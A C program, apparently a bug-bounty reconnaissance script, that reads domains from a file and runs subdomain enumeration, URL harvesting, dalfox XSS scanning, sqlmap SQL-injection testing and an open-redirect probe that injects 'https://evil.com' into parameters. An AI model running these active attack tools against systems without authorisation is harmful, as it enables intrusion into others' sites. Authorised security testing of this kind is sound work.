#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <errno.h>

#define MAX_TARGETS 100
#define MAX_THREADS 4

typedef struct {
    char target[256];
    char hunt_dir[512];
} task_args;

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int active_threads = 0;

/* ===================== UTIL ===================== */

int create_dir(const char *path) {
    if (mkdir(path, 0755) != 0 && errno != EEXIST) {
        perror("mkdir");
        return 0;
    }
    return 1;
}

int is_valid_target(const char *target) {
    for (int i = 0; target[i]; i++) {
        if (!(isalnum(target[i]) || target[i] == '.' || target[i] == '-'))
            return 0;
    }
    return 1;
}

void run_command(const char *cmd) {
    printf("\n[*] %s\n", cmd);
    int ret = system(cmd);
    if (ret != 0) {
        printf("[!] Command failed\n");
    }
}

/* ===================== WORKER ===================== */

void* recon_worker(void* arg) {

    pthread_mutex_lock(&mutex);
    active_threads++;
    pthread_mutex_unlock(&mutex);

    task_args* task = (task_args*)arg;

    char target_path[1024];
    snprintf(target_path, sizeof(target_path),
             "%s/%s", task->hunt_dir, task->target);

    create_dir(target_path);

    /* Write target file */
    char target_file[1024];
    snprintf(target_file, sizeof(target_file),
             "%s/target.txt", target_path);

    FILE *f = fopen(target_file, "w");
    if (!f) {
        perror("fopen");
        goto cleanup;
    }
    fprintf(f, "%s\n", task->target);
    fclose(f);

    char cmd[2048];

    /* Subfinder */
    snprintf(cmd, sizeof(cmd),
             "subfinder -dL %s/target.txt -all --recursive -o %s/Subs01.txt",
             target_path, target_path);
    run_command(cmd);

    /* Subenum */
    snprintf(cmd, sizeof(cmd),
             "subenum -l %s/target.txt -u wayback,crt,abuseipdb,bufferover,Findomain,Subfinder,Amass,Assetfinder -o %s/Subs02.txt",
             target_path, target_path);
    run_command(cmd);

    /* Merge subs */
    snprintf(cmd, sizeof(cmd),
             "cat %s/Subs*.txt | anew | tee %s/AllSubs.txt",
             target_path, target_path);
    run_command(cmd);

    /* Alive subs */
    snprintf(cmd, sizeof(cmd),
             "cat %s/AllSubs.txt | httpx -silent -o %s/AliveSubs.txt",
             target_path, target_path);
    run_command(cmd);

    /* Wayback */
    snprintf(cmd, sizeof(cmd),
             "cat %s/AliveSubs.txt | waybackurls | tee %s/urls.txt",
             target_path, target_path);
    run_command(cmd);

    /* Parameters */
    snprintf(cmd, sizeof(cmd),
             "cat %s/urls.txt | grep '=' | tee %s/param.txt",
             target_path, target_path);
    run_command(cmd);

    /* XSS */
    snprintf(cmd, sizeof(cmd),
             "cat %s/urls.txt | uro | gf xss > %s/xss.txt",
             target_path, target_path);
    run_command(cmd);

    snprintf(cmd, sizeof(cmd),
             "dalfox file %s/xss.txt -o %s/XSSvulnerable.txt",
             target_path, target_path);
    run_command(cmd);

    /* LFI */
    snprintf(cmd, sizeof(cmd),
             "cat %s/AliveSubs.txt | gau | uro | gf lfi | tee %s/lfi.txt",
             target_path, target_path);
    run_command(cmd);

    /* SQLi */
    snprintf(cmd, sizeof(cmd),
             "sqlmap -m %s/param.txt --batch --random-agent --level 1 -o %s/sqlmap.txt",
             target_path, target_path);
    run_command(cmd);
    /* Open Redirect */
    snprintf(cmd, sizeof(cmd),
         "cat %s/urls.txt | grep -i '=http' | "
         "qsreplace 'https://evil.com' | "
         "while read url; do "
         "if curl -Ls -o /dev/null -w '%%{url_effective}' \"$url\" | grep -q evil.com; "
         "then echo \"$url\"; fi; "
         "done | tee %s/open_redirect.txt",
         target_path, target_path);

    run_command(cmd);
    /* JS files */
    snprintf(cmd, sizeof(cmd),
             "cat %s/urls.txt | grep -iE '.js' | grep -ivE '.json' | sort -u > %s/js.txt",
             target_path, target_path);
    run_command(cmd);

    printf("\n[✓] Recon finished for %s\n", task->target);

cleanup:
    free(task);

    pthread_mutex_lock(&mutex);
    active_threads--;
    pthread_mutex_unlock(&mutex);

    pthread_exit(NULL);
}

/* ===================== MAIN ===================== */

int main() {

    const char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "HOME not found\n");
        return 1;
    }

    char hunt_dir[512];
    snprintf(hunt_dir, sizeof(hunt_dir), "%s/hunt", home);
    create_dir(hunt_dir);

    FILE *file = fopen("targets.txt", "r");
    if (!file) {
        printf("Create targets.txt with one domain per line\n");
        return 1;
    }

    pthread_t threads[MAX_TARGETS];
    int count = 0;
    char line[256];

    while (fgets(line, sizeof(line), file) && count < MAX_TARGETS) {

        line[strcspn(line, "\n")] = 0;

        if (!is_valid_target(line)) {
            printf("[!] Skipping invalid target: %s\n", line);
            continue;
        }

        while (active_threads >= MAX_THREADS) {
            sleep(1);
        }

        task_args* task = malloc(sizeof(task_args));
        strncpy(task->target, line, sizeof(task->target)-1);
        task->target[sizeof(task->target)-1] = '\0';
        strncpy(task->hunt_dir, hunt_dir, sizeof(task->hunt_dir)-1);

        if (pthread_create(&threads[count], NULL, recon_worker, task) != 0) {
            perror("pthread_create");
            free(task);
            continue;
        }

        count++;
    }

    fclose(file);

    for (int i = 0; i < count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nAll recon tasks completed.\n");
    return 0;
}
